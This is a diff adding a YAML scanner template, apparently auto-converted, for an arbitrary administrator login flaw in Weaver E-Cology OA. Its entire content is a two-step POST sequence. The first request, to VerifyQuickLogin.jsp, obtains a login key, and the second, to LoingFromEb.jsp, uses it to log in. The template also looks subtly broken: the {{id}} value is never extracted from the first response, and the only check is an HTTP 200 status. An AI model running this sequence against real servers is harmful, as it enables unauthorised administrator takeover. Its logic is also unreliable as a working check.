@@ -1,0 +1,35 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-unsafe_account-CT-483454
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa Unsafe_Account Ct 483454
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-unsafe_account-CT-483454'
+  tags: xpoc
+  reference:
+  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/泛微OA/泛微OA%20E-Cology%20VerifyQuickLogin.jsp%20任意管理员登录漏洞.md
+  - https://zhuanlan.zhihu.com/p/562336905
+  - https://www.weaver.com.cn/
+  - https://work.weixin.qq.com/kfid/kfcbb755e1fd954182d
+http:
+- method: POST
+  path:
+  - /mobile/plugin/VerifyQuickLogin.jsp
+  body: identifier=1&language=1&ipaddress=x.x.x.x
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: POST
+  path:
+  - /mobile/plugin/plus/login/LoingFromEb.jsp
+  body: loginkey={{id}}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
